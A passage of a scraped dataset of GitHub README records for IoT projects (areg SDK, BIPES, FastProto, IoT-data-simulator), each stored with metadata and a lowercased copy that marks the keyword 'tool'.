environment, where the simulation application provides implementation of data layer services, so that the rest of application can be tested without any change.\nthe same technique of simulating data can be used to create api driven test automations.\nexamples\nthere are various examples to demonstrate features of the areg sdk. the examples are listed in the examples/readme.md document.\nlicensing\nareg sdk is dual-licensed under free open source license (apache version 2 license) and commercial license, which gives the commercial support, full rights to create and distribute software without open source license obligations. for licensing details see license document.\nfor commercial license, support or additional information, please visit aregtech website or contact info[at]aregtech.com.\ncall for action\ndo you like the project, have new ideas or need features? you are welcome to join the project. to join the development team, please prepare an introduction and code examples. please also share the project with your connections on and other social media platforms. on github to inspire us and continue to develop the technology with heart! we'll feel useful and motivated to develop more.\nfollow us", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000747, "year": null}, {"Unnamed: 0": 748, "autor": 748, "date": null, "content": "BIPES: Block based Integrated Platform for Embedded Systems.\nBIPES allows anyone to quickly and reliably design, program, build, deploy and test embedded systems and IOT devices and applications. It is fully based on a web environment, so absolutely no software install is needed on the client / developer machine.\nMore information at the project website: bipes.net.br.\nLive version\nTry it now at: bipes.net.br/ide.\nUsage\nTo init submodules, like BIPES/freeboard and BIPES/Databoard, run:\nmake submodules\nTo build/update the offline version with latest, run:\nmake offline\nThis version does not require a server since it has all core files concatanated at ui/index_offline.html, just open this file in a browser. It will also create a bipes_offline.zip. Howver, keep in mind that any tool that requires a server, like MQTT, won't work due to CORS.\nThat's it, enjoy BIPES \ud83d\ude04.\nDocumentation\nThe documentation is online at bipes.net.br/docs.\nTo build the documentation out of a fresh clone, do:\nmake doc\nafter having installed the theme, sphinx and sphinx-js.\npip install sphinx sphinx-js furo\nMore information\nSome functions of ui/index.html were based on Blopy project (https://github.com/mnoriaki/Blopy), by Noriaki Mitsunaga (https://github.com/mnoriaki).\nOpenCV blocks were automatically generated using berak's OpenCV to Blockly generator (https://github.com/berak/blockly-cv2/tree/master/gen).\nWe also use xterm.js (https://github.com/xtermjs/xterm.js/) and codemirror.js (https://github.com/codemirror/codemirror).", "link": "https://github.com/BIPES/BIPES", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "bipes: block based integrated platform for embedded systems.\nbipes allows anyone to quickly and reliably design, program, build, deploy and test embedded systems and iot devices and applications. it is fully based on a web environment, so absolutely no software install is needed on the client / developer machine.\nmore information at the project website: bipes.net.br.\nlive version\ntry it now at: bipes.net.br/ide.\nusage\nto init submodules, like bipes/freeboard and bipes/databoard, run:\nmake submodules\nto build/update the offline version with latest, run:\nmake offline\nthis version does not require a server since it has all core files concatanated at ui/index_offline.html, just open this file in a browser. it will also create a bipes_offline.zip. howver, keep in mind that any -----> tool !!!  that requires a server, like mqtt, won't work due to cors.\nthat's it, enjoy bipes \ud83d\ude04.\ndocumentation\nthe documentation is online at bipes.net.br/docs.\nto build the documentation out of a fresh clone, do:\nmake doc\nafter having installed the theme, sphinx and sphinx-js.\npip install sphinx sphinx-js furo\nmore information\nsome functions of ui/index.html were based on blopy project (https://github.com/mnoriaki/blopy), by noriaki mitsunaga (https://github.com/mnoriaki).\nopencv blocks were automatically generated using berak's opencv to blockly generator (https://github.com/berak/blockly-cv2/tree/master/gen).\nwe also use xterm.js (https://github.com/xtermjs/xterm.js/) and codemirror.js (https://github.com/codemirror/codemirror).", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000748, "year": null}, {"Unnamed: 0": 750, "autor": 750, "date": null, "content": "English | \u4e2d\u6587\nFast Protocol\nFastProto is a protocolized binary serialization & deserialization tool written in Java. It can not only customize the binary protocol through annotations, but also supports data compression, encryption, and data integrity checksum, protocol version verification. FastProto uses a new way to solve the problem of cross-language and cross-platform data exchange in Java, which is especially suitable for the Internet of Things (IoT).\nFeatures\nProtocolized binary serialization & deserialization\nSupport unsigned data type\nSupport reverse addressing, suitable for non-fixed length binary data\nCustomize endianness (byte order)\nSupport decoding formula & encoding formula\nSupport data compress and decompress(gzip, deflate)\nSupport protocol version verification\nSupport data integrity verification\nSupport data decrypt & encrypt\nBuilt-in Kafka serializer & deserializer\nBuilt-in Netty decoder & encoder\nUnder Developing\nCode structure & performance optimization\nAdd test cases to increase unit test coverage\nParse multiple pieces of binary data into one data object\nCompared with ProtoBuf\nAlthough both ProtoBuf and FastProto are used to solve the problem of cross-language and cross-platform data exchange, they have completely different ways of solving the problem:\nProtoBuf customizes the protocol by writing schema, and FastProto customizes the protocol by annotation\nProtoBuf can adapt to multiple languages, while FastProto only targets the Java language\nFastProto performance is more superior, custom protocol granularity is more refined\nFastProto is more recommended for the following scenarios:\nThe performance requirements are demanding, and the performance loss caused by common data formats (JSON/XML) cannot be tolerated\nThe data source contains a lot of binary content, such as data collected through fieldbus (CAN/MVB/RS-485), which is not suitable for text format\nRestrictions on end software development can only be in binary format, and ProtoBuf is not supported. For example, embedded devices use non-traditional programming methods (ladder diagram/function diagram/ST)\nMaven\n<dependency>\n<groupId>org.indunet</groupId>\n<artifactId>fastproto</artifactId>\n<version>3.0.0</version>\n</dependency>\nQuick Start\nImagine such an application, there is a monitoring device collecting weather data in realtime and sends to the weather station in binary format\uff0cthe binary data has fixed length of 20 bytes:\n65 00 7F 69 3D 84 7A 01 00 00 55 00 F1 FF 0D 00 00 00 07 00\nThe binary data contains 8 different types of signals, the specific protocol is as follows:\nByte Offset Bit Offset Data Type(C/C++) Signal Name Unit Formula\n0 unsigned char device id\n1 reserved\n2-9 long long time ms\n10-11 unsigned short humidity %RH\n12-13 short temperature \u2103\n14-17 unsigned int pressure Pa p * 0.1\n18 0 bool temperature valid\n18 1 bool humidity valid\n18 2 bool pressure valid\n18 3-7 reserved\n19 reserved\nSerialization & Deserialization\nAfter the weather station receives the data, it needs to be converted into Java data objects for subsequent business function development. First, define the Java data object Weather according to the protocol, and then use the FastProto data type annotation to annotate each attribute. It should be noted that the value attribute of any data type annotation corresponds to the byte offset of the signal.\npublic class Weather {\n@UInteger8Type(0)\nint id;\n@TimestampType(2)\nTimestamp time;\n@UInteger16Type(10)\nint humidity;\n@Integer16Type(12)\nint temperature;\n@UInteger32Type(14)\nlong pressure;\n@BooleanType(value = 18, bitOffset = 0)\nboolean temperatureValid;\n@BooleanType(value = 18, bitOffset = 1)\nboolean humidityValid;\n@BooleanType(value = 18, bitOffset = 2)\nboolean pressureValid;\n}\nInvoke the FastProto::parseFrom() method to deserialize the binary data into the Java data object Weather\nbyte[] datagram = ... // Datagram sent by monitoring device.\nWeather weather = FastProto.parseFrom(datagram, Weather.class);\nInvoke the FastProto::toByteArray() method to serialize the Java data object Weather into binary data. The second parameter of this method is the length of the binary data. If the user does not specify it, FastProto will automatically guess the length.\nbyte[] datagram = FastProto.toByteArray(weather, 20);\nDecoding Formula & Encoding Formula\nPerhaps you have noticed that the pressure signal corresponds to a conversion formula, usually requiring the user to multiply the serialized result by 0.1, which is an extremely common operation in IoT data exchange. To help users reduce intermediate steps, FastProto introduces encoding formulas and decoding formulas.\nThe custom decoding formula needs to implement the java.lang.function.Function interface, and then specify the decoding formula through the decodingFormula attribute of the data type annotation.\npublic class PressureDecodeFormula implements Function<Long, Double> {\n@Override\npublic Double apply(Long value) {\nreturn value * 0.1;\n}\n}\npublic class Weather {\n...\n@UInteger32Type(value = 14, decodingFormula = DecodeSpeedFormula.class)\ndouble pressure;\n}\nSimilarly, In the same way, the encoding formula also needs to implement the java.lang.function.Function interface, and then specify the encoding formula through the encodingFormula attribute of the data type annotation. more\npublic class PressureEncodeFormula implements Function<Double, Long> {\n@Override\npublic Long apply(Double value) {\nreturn (long) (value * 10);\n}\n}\npublic class Weather {\n...\n@UInteger32Type(value = 14, decodingFormula = PressureDecodeFormula.class, encodingFormula = PressureEncodeFormula.class)\ndouble pressure;\n}\nOther Functions\nFastProto supports data compression, protocol version verification, data integrity verification, and data symmetric encryption. Each function can be enabled by annotations.\n@EnableCrypto(value = CryptoPolicy.AES_ECB_PKCS5PADDING, key = \"330926\")\n@EnableProtocolVersion(value = 78, version = 17)\n@EnableCompress(value = CompressPolicy.DEFLATE, level = 2)\n@EnableChecksum(value = -4, start = 0, length = -5, checkPolicy = CheckPolicy.CRC32, endianPolicy = EndianPolicy.BIG)\npublic class Weather {\n...\n}\nCore Annotations\nFastProto supports Java primitive data types, Timestamp, String and byte array. The above types can be replaced by @AutoType. Taking into account cross-language and cross-platform data exchange, FastProto also introduces unsigned types. more\nAnnotation Java C/C++ Size AutoType\n@BooleanType Boolean / boolean bool 1 bit \u221a\n@CharacterType Character / char -- 2 bytes \u221a\n@ByteType Byte / byte char 1 byte \u221a\n@ShortType Short / short short 2 bytes \u221a\n@IntegerType Integer / int int 4 bytes \u221a\n@LongType Long / long long long 8 bytes \u221a\n@FloatType Float / float float 4 bytes \u221a\n@DoubleType Double / double double 8 bytes \u221a\n@Integer8Type Integer / int char 1 byte \u00d7\n@Integer16Type Integer / int short 2 bytes \u00d7\n@UInteger8Type Integer / int unsigned char 1 byte \u00d7\n@UInteger16Type Integer / int unsigned short 2 bytes \u00d7\n@UInteger32Type Long / long unsigned long 4 bytes \u00d7\n@UInteger64Type BigInteger unsigned long long 8 bytes \u221a\n@BinaryType byte[] char[] N bytes \u221a\n@StringType java.lang.String -- N bytes \u221a\n@TimestampType java.sql.Timestamp / java.util.Date -- 4 / 8 bytes \u221a\n@ArrayType primitive type array primitive type array N \u5b57\u8282 \u221a\n@ListType primitive type list -- N \u5b57\u8282 \u221a\n@EnumType enum enum N \u5b57\u8282 \u221a\nFastProto also provides some auxiliary annotations to help users further customize the binary format, decoding and encoding process.\nAnnotation Scope Description\n@Endian Class & Field Endianness, default as little endian.\n@DecodingIgnore Field Ignore the field when decoding.\n@EncodingIgnore Field Ignore the field when encoding.\n@EnableCompress Class Enable compress & decompress, default as deflate\n@EnableProtocolVersion Class Enable protocol version verification\n@EnableCheckSum Class Enable checksum verification\n@EnableCrypto Class Enable encrypt & decrypt\n@EnableFixedLength Class Enable fixed length of datagram\nBenchmark\nmacOS, m1 8 cores, 16gb\nopenjdk 1.8.0_292\ndatagram of 128 bytes and nested protocol class of 48 fields\nBenchmark Mode Samples Score Error Units\nFastProto::parseFrom throughput 10 291.2 \u00b1 1.6 ops/ms\nFastProto::toByteArray throughput 10 285.7 \u00b1 1.5 ops/ms\nBuild Requirements\nJava 1.8+\nMaven 3.5+\nWelcome\nFastProto has obtained the support of JetBrain Open Source Project, which can provide free license of all product pack for all core contributors. If you are interested in this project and want to join and undertake part of the work (development/testing/documentation), please feel free to contact me via email deng_ran@foxmail.com.\nLicense\nFastProto is released under the Apache 2.0 license.\nCopyright 2019-2021 indunet.org\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at the following link.\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.", "link": "https://github.com/indunet/fastproto", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "english | \u4e2d\u6587\nfast protocol\nfastproto is a protocolized binary serialization & deserialization -----> tool !!!  written in java. it can not only customize the binary protocol through annotations, but also supports data compression, encryption, and data integrity checksum, protocol version verification. fastproto uses a new way to solve the problem of cross-language and cross-platform data exchange in java, which is especially suitable for the internet of things (iot).\nfeatures\nprotocolized binary serialization & deserialization\nsupport unsigned data type\nsupport reverse addressing, suitable for non-fixed length binary data\ncustomize endianness (byte order)\nsupport decoding formula & encoding formula\nsupport data compress and decompress(gzip, deflate)\nsupport protocol version verification\nsupport data integrity verification\nsupport data decrypt & encrypt\nbuilt-in kafka serializer & deserializer\nbuilt-in netty decoder & encoder\nunder developing\ncode structure & performance optimization\nadd test cases to increase unit test coverage\nparse multiple pieces of binary data into one data object\ncompared with protobuf\nalthough both protobuf and fastproto are used to solve the problem of cross-language and cross-platform data exchange, they have completely different ways of solving the problem:\nprotobuf customizes the protocol by writing schema, and fastproto customizes the protocol by annotation\nprotobuf can adapt to multiple languages, while fastproto only targets the java language\nfastproto performance is more superior, custom protocol granularity is more refined\nfastproto is more recommended for the following scenarios:\nthe performance requirements are demanding, and the performance loss caused by common data formats (json/xml) cannot be tolerated\nthe data source contains a lot of binary content, such as data collected through fieldbus (can/mvb/rs-485), which is not suitable for text format\nrestrictions on end software development can only be in binary format, and protobuf is not supported. for example, embedded devices use non-traditional programming methods (ladder diagram/function diagram/st)\nmaven\n<dependency>\n<groupid>org.indunet</groupid>\n<artifactid>fastproto</artifactid>\n<version>3.0.0</version>\n</dependency>\nquick start\nimagine such an application, there is a monitoring device collecting weather data in realtime and sends to the weather station in binary format\uff0cthe binary data has fixed length of 20 bytes:\n65 00 7f 69 3d 84 7a 01 00 00 55 00 f1 ff 0d 00 00 00 07 00\nthe binary data contains 8 different types of signals, the specific protocol is as follows:\nbyte offset bit offset data type(c/c++) signal name unit formula\n0 unsigned char device id\n1 reserved\n2-9 long long time ms\n10-11 unsigned short humidity %rh\n12-13 short temperature \u2103\n14-17 unsigned int pressure pa p * 0.1\n18 0 bool temperature valid\n18 1 bool humidity valid\n18 2 bool pressure valid\n18 3-7 reserved\n19 reserved\nserialization & deserialization\nafter the weather station receives the data, it needs to be converted into java data objects for subsequent business function development. first, define the java data object weather according to the protocol, and then use the fastproto data type annotation to annotate each attribute. it should be noted that the value attribute of any data type annotation corresponds to the byte offset of the signal.\npublic class weather {\n@uinteger8type(0)\nint id;\n@timestamptype(2)\ntimestamp time;\n@uinteger16type(10)\nint humidity;\n@integer16type(12)\nint temperature;\n@uinteger32type(14)\nlong pressure;\n@booleantype(value = 18, bitoffset = 0)\nboolean temperaturevalid;\n@booleantype(value = 18, bitoffset = 1)\nboolean humidityvalid;\n@booleantype(value = 18, bitoffset = 2)\nboolean pressurevalid;\n}\ninvoke the fastproto::parsefrom() method to deserialize the binary data into the java data object weather\nbyte[] datagram = ... // datagram sent by monitoring device.\nweather weather = fastproto.parsefrom(datagram, weather.class);\ninvoke the fastproto::tobytearray() method to serialize the java data object weather into binary data. the second parameter of this method is the length of the binary data. if the user does not specify it, fastproto will automatically guess the length.\nbyte[] datagram = fastproto.tobytearray(weather, 20);\ndecoding formula & encoding formula\nperhaps you have noticed that the pressure signal corresponds to a conversion formula, usually requiring the user to multiply the serialized result by 0.1, which is an extremely common operation in iot data exchange. to help users reduce intermediate steps, fastproto introduces encoding formulas and decoding formulas.\nthe custom decoding formula needs to implement the java.lang.function.function interface, and then specify the decoding formula through the decodingformula attribute of the data type annotation.\npublic class pressuredecodeformula implements function<long, double> {\n@override\npublic double apply(long value) {\nreturn value * 0.1;\n}\n}\npublic class weather {\n...\n@uinteger32type(value = 14, decodingformula = decodespeedformula.class)\ndouble pressure;\n}\nsimilarly, in the same way, the encoding formula also needs to implement the java.lang.function.function interface, and then specify the encoding formula through the encodingformula attribute of the data type annotation. more\npublic class pressureencodeformula implements function<double, long> {\n@override\npublic long apply(double value) {\nreturn (long) (value * 10);\n}\n}\npublic class weather {\n...\n@uinteger32type(value = 14, decodingformula = pressuredecodeformula.class, encodingformula = pressureencodeformula.class)\ndouble pressure;\n}\nother functions\nfastproto supports data compression, protocol version verification, data integrity verification, and data symmetric encryption. each function can be enabled by annotations.\n@enablecrypto(value = cryptopolicy.aes_ecb_pkcs5padding, key = \"330926\")\n@enableprotocolversion(value = 78, version = 17)\n@enablecompress(value = compresspolicy.deflate, level = 2)\n@enablechecksum(value = -4, start = 0, length = -5, checkpolicy = checkpolicy.crc32, endianpolicy = endianpolicy.big)\npublic class weather {\n...\n}\ncore annotations\nfastproto supports java primitive data types, timestamp, string and byte array. the above types can be replaced by @autotype. taking into account cross-language and cross-platform data exchange, fastproto also introduces unsigned types. more\nannotation java c/c++ size autotype\n@booleantype boolean / boolean bool 1 bit \u221a\n@charactertype character / char -- 2 bytes \u221a\n@bytetype byte / byte char 1 byte \u221a\n@shorttype short / short short 2 bytes \u221a\n@integertype integer / int int 4 bytes \u221a\n@longtype long / long long long 8 bytes \u221a\n@floattype float / float float 4 bytes \u221a\n@doubletype double / double double 8 bytes \u221a\n@integer8type integer / int char 1 byte \u00d7\n@integer16type integer / int short 2 bytes \u00d7\n@uinteger8type integer / int unsigned char 1 byte \u00d7\n@uinteger16type integer / int unsigned short 2 bytes \u00d7\n@uinteger32type long / long unsigned long 4 bytes \u00d7\n@uinteger64type biginteger unsigned long long 8 bytes \u221a\n@binarytype byte[] char[] n bytes \u221a\n@stringtype java.lang.string -- n bytes \u221a\n@timestamptype java.sql.timestamp / java.util.date -- 4 / 8 bytes \u221a\n@arraytype primitive type array primitive type array n \u5b57\u8282 \u221a\n@listtype primitive type list -- n \u5b57\u8282 \u221a\n@enumtype enum enum n \u5b57\u8282 \u221a\nfastproto also provides some auxiliary annotations to help users further customize the binary format, decoding and encoding process.\nannotation scope description\n@endian class & field endianness, default as little endian.\n@decodingignore field ignore the field when decoding.\n@encodingignore field ignore the field when encoding.\n@enablecompress class enable compress & decompress, default as deflate\n@enableprotocolversion class enable protocol version verification\n@enablechecksum class enable checksum verification\n@enablecrypto class enable encrypt & decrypt\n@enablefixedlength class enable fixed length of datagram\nbenchmark\nmacos, m1 8 cores, 16gb\nopenjdk 1.8.0_292\ndatagram of 128 bytes and nested protocol class of 48 fields\nbenchmark mode samples score error units\nfastproto::parsefrom throughput 10 291.2 \u00b1 1.6 ops/ms\nfastproto::tobytearray throughput 10 285.7 \u00b1 1.5 ops/ms\nbuild requirements\njava 1.8+\nmaven 3.5+\nwelcome\nfastproto has obtained the support of jetbrain open source project, which can provide free license of all product pack for all core contributors. if you are interested in this project and want to join and undertake part of the work (development/testing/documentation), please feel free to contact me via email deng_ran@foxmail.com.\nlicense\nfastproto is released under the apache 2.0 license.\ncopyright 2019-2021 indunet.org\nlicensed under the apache license, version 2.0 (the \"license\");\nyou may not use this file except in compliance with the license.\nyou may obtain a copy of the license at the following link.\nhttp://www.apache.org/licenses/license-2.0\nunless required by applicable law or agreed to in writing, software\ndistributed under the license is distributed on an \"as is\" basis,\nwithout warranties or conditions of any kind, either express or implied.\nsee the license for the specific language governing permissions and\nlimitations under the license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000750, "year": null}, {"Unnamed: 0": 753, "autor": 753, "date": null, "content": "IoT-data-simulator is the tool which allows you to simulate IoT devices data with great flexibility. With this tool you won't need to code another new simulator for each IoT project.\nSimulator features that you will like:\nReplay existing datasets with modified data (such as updated timestamps, generated ids etc);\nAutomatic derivation of dataset structure which allows you to customize your dataset without the need to describe its structure from scratch;\nGenerate datasets of any complexity. Generated data can be described via constructor or JavaScript function. Multiple rules are available in constructor such as \"Random integer\", \"UUID\" and others. JS function gives you maximum flexibility to generate data - it supports popular JS libraries lodash and momentjs.\nSend data to the platforms you use with minimum configuration (see Supported target systems section);\nCustomize frequency with which data will be sent - based on dataset timestamp properties or just constant time interval. The tool also supports relative timestamp properties which depend on other timestamp or date properties. It means that data can be replayed with the same interval between timestamps as in initial dataset.\nEasy installation - all you need is to download 2 docker files and run 2 commands.\nIf you would like read more about why we created this tool, please read Motivation section.\nIntroduction video\nhttps://www.youtube.com/playlist?list=PLkiB-GyDBMbfA7AbenLUpvYZKeyuqlBPy\nInstallation\nPrerequisites docker (v. 17.05+) and docker-compose should be installed\nStartup Run the following commands in the folder with docker-compose.yml and .env files from release folder:\ndocker-compose pull\ndocker-compose up\nAfter a while UI will be available by the following url: http://localhost:8090 or http://docker-machine-ip:8090 depending on the OS or docker version.\nTerms\nTo use IoT-data-simulator you should understand the following concepts:\nsession \u2013 main composite application entity. Data is being generated and sent to external IoT platforms only when session is running. Session consists of data definition (optional), timer, devices (optional), processing rules and target system;\ndata definition - describes data structure that is sent to a target system. Consists of dataset, or schema, or dataset and schema.\ndataset (required if no schema provided) - .csv or .json file that is uploaded by user to the internal tool object storage (minio) via UI or to the external Amazon S3 service. If dataset is provided, its content is replayed by the tool during session run.\nschema (required if dataset is not provided) - describes dataset structure or data that will be generated on runtime. Schema can be derived from dataset or created from scratch via UI constructor. If schema is not provided, data will be generated via custom JS function provided by user.\ntarget system - describes external system where simulated data is sent to;\ndevice \u2013 encapsulates specific set of values and target system properties.\nDevices can be used to override specific values in generated payload. It can be useful when you have common payload structure and would like to ovveride some specific properties such as id, geo position for different IoT devices.\nDevices can be used to override target system properties. This use case is helpful for instance when each device should send payload to its own topic.\nUsage\nReplay existing dataset as is\nThe simplest use case which can help you to start working with the tool - replay existing dataset as is.\nWe need to create session which will send dataset records without any modification to a target system. For this use case we don't need data schema - just JS function that will return current dataset record (datasetEntry). Go to the create session screen, then:\nUpload new json or csv dataset on data definition creation flow and skip schema step;\nSelect timer options (how often data will be generated by the tool)\nSkip \"Select devices\" step.\nApply data processing rules. As you can see processing function is very simple:\nfunction process(state, datasetEntry, deviceName) {\nreturn datasetEntry;\n}\nSelect or create dummy target system which is not actually sending data anywhere but allows you to see payload in session console;\nEnter session name and complete creation flow;\nRun session and explore payload in the session console;\nSession will stop when all records from dataset will be read.\nReplay dataset with updated date/timestamp properties\nReplaying dataset without modifying any parameters is not really useful use case, so let's replay dataset with updated date/timestamp properties. Go to create session screen, then:\nUpload dataset which has at least one date/timestamp property on create definition screen. Make sure that date/timestamp property type has been derived correctly and apply schema. Dataset may look like the following:\n{\"timestamp\": 1517303155600, \"id\": 1 }\n{\"timestamp\": 1517303155800, \"id\": 2 }\n...\nSelect timer options.\nSkip Select devices step\nApply data processing rules. Current time rule is selected by default for date/timestamp property. It means that timestamp property will be updated with current time, but the difference between timestamps of two adjacent dataset records will stay the same. Also, if there are more than one timestamp properties in one record, the first one will have Current time rule by default, others - Relative time rule, which means that timestamps will be updated relatively to Current time timestamp.\nSelect or create dummy target system\nEnter new session name and complete creation flow\nRun session and explore session console\nGenerate data\nIf you would like to generate data on fly. This can be achieved in two possible ways:\na) With JS function. Go to Create session screen, then:\nSkip Select definition step;\nSelect timer options;\nSkip \"Select devices\" step.\nOn data processing step you can write any JS function that returns any value. By default the following function is used:\nfunction process(state, datasetEntry, deviceName) {\nreturn {\ntimestamp: moment().valueOf()\n}\n}\nSelect or create dummy target system;\nEnter session name and complete creation flow;\nRun session and explore payload in the session console;\nb) With schema\nSkip dataset selection step on definition creation flow;\nCreate simple schema\nSelect timer options (how often data will be generated by the tool)\nSkip \"Select devices\" step.\nApply data processing rules via rules constructor;\nCreate or select dummy target system;\nEnter session name and complete creation flow\nRun session and explore payload in the session console;\nIntended usage and useful scenarios\nDerive schema from dataset and use it without dataset (data generation mode)\nThis scenario is very useful when dataset has complex structure and you doesn't want to create schema for it from scratch. This can be achieved with the following steps:\nCreate definition with dataset and apply derived schema;\nUpdate created definition and unselect dataset - derived schema won't be removed;\nStore state between data processing iterations. Implement counter\nLet's say we would like to create simple counter with the following payload sent to a target system:\n{\n\"count\": 1 // number which increases on each iteration\n}\nIn this case we could use data generatation mode (see Usage section above). On the step #2 create schema with one integer property as shown on the screenshot below:\nOn step #5 select \"Custom function\" rule for the \"count\" property. Open editor and apply the following JS function:\nfunction custom(ruleState, sessionState, deviceName) {\nif(typeof ruleState.counter === 'undefined') {\nruleState.counter = 0;\n}\nruleState.counter++\nreturn ruleState.counter;\n}\nSend data to different Kafka topics:\nTo send data to different Kafka topics we should create several devices which will override target system properties with their \"topic data\". Lets generate data for our example. Go to Create session screen, then:\nCreate data definition without dataset and with simple schema;\nSelect timer options\nGo to \"Create device\" screen, enter device name and press \"Proceed\".\nYou should see target system screen that is specific for this device. Go to Create target system screen;\nEnter target system name and select \"Kafka\" type.\nPopulate only topic field with \"Kafka\" topic corresponding to this device. When creating device specific target system, only populated fields will override session target system properties.\nRepeat steps 3 - 6 for all Kafka topics\nSelect all devices on Select devices step of session creation flow and press \"Proceed\";\nSelect device injection rule. Please, read more about device injection rules in project Gitbook;\nApply processing rules.\nCreate or select Kafka target system (topic should be filled, but anyway it will be overwritten by devices specific target systems topic parameter;\nEnter session name and complete session creation flow;\nRun created session and observe session console;\nGenerate dataset and save it to local minio object storage\nTo generate data and save it as file on local minio object storage create Local storage target system while creating session. Populate dataset field with desired file name.\nInject device property to processing rules\nGo to Create session screen, then:\nSelect data definition with schema\nSelect timer options\nCreate one or more devices with populated properties fields\nSelect created devices\nSelect device injection rule\nOn processing rules step select Device property rule for specific property that you would like to overwrite with device property;\nComplete session creation flow\nSupported target systems\nIoT-data-simulator can send payload to the following target systems (with available security types in parentheses):\nAMQP (credentials and certificates)\nKafka (certificates)\nLocal object storage (minio object storage)\nMQTT (access keys, access token, credentials, certificates)\nREST (credentials, certificates)\nWebsocket (credentials, certificates)\nFAQ\nQ: I've updated session but it still uses old parameters A: Session parameters are updated only when session is stopped. If session was paused, it will still use the previous parameters;\nQ: What IoT platforms do you support? A: In our company we used IoT data simulator tool for working with Thingsboard, AWS and Predix platforms. But it doesn't mean that it cannot be used with others.\nMotivation\nAn IoT data simulator is a required tool in any IoT project. While using real world sensors and devices is required for final integration testing to make sure the system works end to end without any surprises, it is very impractical to use the real devices during development and initial testing phases where tests tend to be quicker, shorter, failing quicker and more often.\nData simulator solves several problems at once:\nIt is not necessary to run the physical equipment just to perform a unit or early integration test.\nYou can use synthetic generated data if you do not yet have access to the physical devices, or you can replay captured data to get it as real as possible.\nBy imploding the data with some randomization, you can simulate a large number of devices that you may not be able to get hold of during the test and development.\nYou can replay data at various frequencies to run the test quicker (e.g. when the real world data is pushed every 5 minutes and it takes several days to trigger an alert).\nYou can simulate data from different stages of the system, so that the testing of the later stages does not have to wait until all the previous stages are completed to transform raw data into a suitable input. For example, you can simulate raw device data to develop and test initial processing, simulate \u201ccleaned up\u201d data stream to develop and test analytic components, and simulate analytic component results to develop and test visualization and UX.\nWritten with StackEdit.\nContributing\nThanks for your interest in contributing!\nGet started here link.", "link": "https://github.com/IBA-Group-IT/IoT-data-simulator", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "iot-data-simulator is the -----> tool !!!  which allows you to simulate iot devices data with great flexibility. with this tool you won't need to code another new simulator for each iot project.\nsimulator features that you will like:\nreplay existing datasets with modified data (such as updated timestamps, generated ids etc);\nautomatic derivation of dataset structure which allows you to customize your dataset without the need to describe its structure from scratch;\ngenerate datasets of any complexity. generated data can be described via constructor or javascript function. multiple rules are available in constructor such as \"random integer\", \"uuid\" and others. js function gives you maximum flexibility to generate data - it supports popular js libraries lodash and momentjs.\nsend data to the platforms you use with minimum configuration (see supported target systems section);\ncustomize frequency with which data will be sent - based on dataset timestamp properties or just constant time interval. the tool also supports relative timestamp properties which depend on other timestamp or date properties. it means that data can be replayed with the same interval between timestamps as in initial dataset.\neasy installation - all you need is to download 2 docker files and run 2 commands.\nif you would like read more about why we created this tool, please read motivation section.\nintroduction video\nhttps://www.youtube.com/playlist?list=plkib-gydbmbfa7abenlupvyzkeyuqlbpy\ninstallation\nprerequisites docker (v. 17.05+) and docker-compose should be installed\nstartup run the following commands in the folder with docker-compose.yml and .env files from release folder:\ndocker-compose pull\ndocker-compose up\nafter a while ui will be available by the following url: http://localhost:8090 or http://docker-machine-ip:8090 depending on the os or docker version.\nterms\nto use iot-data-simulator you should understand the following concepts:\nsession \u2013 main composite application entity. data is being generated and sent to external iot platforms only when session is running. session consists of data definition (optional), timer, devices (optional), processing rules and target system;\ndata definition - describes data structure that is sent to a target system. consists of dataset, or schema, or dataset and schema.\ndataset (required if no schema provided) - .csv or .json file that is uploaded by user to the internal tool object storage (minio) via ui or to the external amazon s3 service. if dataset is provided, its content is replayed by the tool during session run.\nschema (required if dataset is not provided) - describes dataset structure or data that will be generated on runtime. schema can be derived from dataset or created from scratch via ui constructor. if schema is not provided, data will be generated via custom js function provided by user.\ntarget system - describes external system where simulated data is sent to;\ndevice \u2013 encapsulates specific set of values and target system properties.\ndevices can be used to override specific values in generated payload. it can be useful when you have common payload structure and would like to ovveride some specific properties such as id, geo position for different iot devices.\ndevices can be used to override target system properties. this use case is helpful for instance when each device should send payload to its own topic.\nusage\nreplay existing dataset as is\nthe simplest use case which can help you to start working with the tool - replay existing dataset as is.\nwe need to create session which will send dataset records without any modification to a target system. for this use case we don't need data schema - just js function that will return current dataset record (datasetentry). go to the create session screen, then:\nupload new json or csv dataset on data definition creation flow and skip schema step;\nselect timer options (how often data will be generated by the tool)\nskip \"select devices\" step.\napply data processing rules. as you can see processing function is very simple:\nfunction process(state, datasetentry, devicename) {\nreturn datasetentry;\n}\nselect or create dummy target system which is not actually sending data anywhere but allows you to see payload in session console;\nenter session name and complete creation flow;\nrun session and explore payload in the session console;\nsession will stop when all records from dataset will be read.\nreplay dataset with updated date/timestamp properties\nreplaying dataset without modifying any parameters is not really useful use case, so let's replay dataset with updated date/timestamp properties. go to create session screen, then:\nupload dataset which has at least one date/timestamp property on create definition screen. make sure that date/timestamp property type has been derived correctly and apply schema. dataset may look like the following:\n{\"timestamp\": 1517303155600, \"id\": 1 }\n{\"timestamp\": 1517303155800, \"id\": 2 }\n...\nselect timer options.\nskip select devices step\napply data processing rules. current time rule is selected by default for date/timestamp property. it means that timestamp property will be updated with current time, but the difference between timestamps of two adjacent dataset records will stay the same. also, if there are more than one timestamp properties in one record, the first one will have current time rule by default, others - relative time rule, which means that timestamps will be updated relatively to current time timestamp.\nselect or create dummy target system\nenter new session name and complete creation flow\nrun session and explore session console\ngenerate data\nif you would like to generate data on fly. this can be achieved in two possible ways:\na) with js function. go to create session screen, then:\nskip select 